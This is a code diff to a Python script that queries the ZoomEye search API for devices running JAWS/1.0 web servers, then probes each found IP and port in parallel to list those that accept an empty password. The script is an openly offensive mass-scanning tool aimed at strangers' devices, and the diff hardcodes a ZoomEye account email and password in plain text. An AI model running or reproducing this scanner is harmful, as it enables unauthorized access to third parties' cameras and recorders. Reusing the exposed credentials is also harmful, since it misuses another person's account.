@@ -1,6 +1,8 @@
 #!/usr/bin/python
 #-*- coding=utf8 -*-
+import re
 import sys
+import json
 import time
 import queue
 import urllib
@@ -9,16 +11,61 @@ import threading
 
 global i
 global port
+user = '157303749@qq.com'
+password = 'mypasswordisnull12312'     #用于登录telent404的账号密码
+
+
 passwd = ""
 
 class Scanner:
    def __init__(self):
+       self.page=1
        self.threads_max=10
        self.queue = queue
        self.contral = "true"
        self.threads = []
+       self.raw_urls =list()
+       self.word_list = []     #用于去重
+   def check_user_pwd_actoken(self):
+       data = {'username': user, 'password': password}
+       check = requests.post(url='https://api.zoomeye.org/user/login', json=data)
+       try:
+               access_token = check.json()#返回用于查询的access_token
+               print("[+]连接成功")
+               return access_token
+       except:
+               print("[-]连接失败")
+
+   def findurl_andsave(self):
+       access_token = self.check_user_pwd_actoken()
+       mode = "host"             ##
+       query = "JAWS/1.0"        ##
+       headers_authorization = {'Authorization': 'JWT ' + access_token["access_token"]}
+       a=[]
+       while self.page<=20:#try:
+               req = requests.get(
+                   url='https://api.zoomeye.org/' + mode + '/search?query=' + query + "&page=" + str(self.page),
+                   headers=headers_authorization)
+               #print(req.content)
+               req_json = req.json()
+               for line in req_json["matches"]:
+                        a.append(line["ip"] + ":" + str(line["portinfo"]["port"]) + "\n")
+               self.raw_urls.extend(a)
+               print("已录入："+str(self.page))
+               print(self.raw_urls)
+               self.page+=1
+
+           #except:
+               #print("[-]查询时发生错误")
+       self.raw_urls = set(self.raw_urls)
+       with open("zoomeye_raw.txt","w")as f:
+          f.writelines(self.raw_urls)
+       f.close()
+       print("[+]录入zoomeye_raw.txt完成")
+
+
    def read_url(self):
-       with open("ZoomEyes_Raw.txt") as f:
+       with open("zoomeye_raw.txt") as f:
           for line in f.readlines():
 
             host = line.split(":")
@@ -58,9 +105,6 @@ class Scanner:
                 t = threading.Thread(target=self.req_test,args=(url,ip,port))
                 t.start()
             #self.req_test()
-
-   def Mian(self):
-       self.read_url()
    def req_test(self,url,ip,port):
           #print("[+]req_test:"+self.ip)
           #print("100")
@@ -71,7 +115,7 @@ class Scanner:
           if (length == "175"):              #返回页面length=175,登录成功
               print("[HERE]"+ip +":"+port+ " HaS NULL PasswD")
               try:
-                   files = open("Results.txt", "a")
+                   files = open("jaws_（有重复）.txt", "a")
                    data = ip +":"+ port
                    files.write(data)
                    files.write("\n")
@@ -82,6 +126,26 @@ class Scanner:
                  print("[-]"+ip+":"+port)
         except:
             print("[--]"+ip+":"+port)
+   def repeat_setter(self):
+     try:
+        with open(sys.argv[-1])as f:
+            for line in f.readlines():
+                self.word_list.append(line)
+
+                self.word_list = list(set(self.word_list))
+        try:
+            files = open("jaws_空密码.txt", "a")
+            files.writelines(self.word_list)
+            files.close()
+        except:
+            pass
+     except:
+        print("读写出错...")
+   def Mian(self):
+       self.findurl_andsave()
+       self.read_url()
+       self.repeat_setter()
+
 if (__name__=="__main__"):
    S1=Scanner()
    S1.Mian()
